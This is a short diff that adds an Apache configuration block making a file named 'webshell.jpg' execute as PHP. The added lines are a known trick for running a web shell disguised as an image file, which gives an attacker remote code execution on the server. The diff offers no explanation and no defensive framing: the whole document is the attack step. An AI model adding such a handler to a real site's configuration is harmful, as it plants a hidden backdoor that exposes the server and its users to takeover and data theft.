@@ -1,0 +1,3 @@
+<Files "webshell.jpg">
+    SetHandler application/x-httpd-php
+</Files>
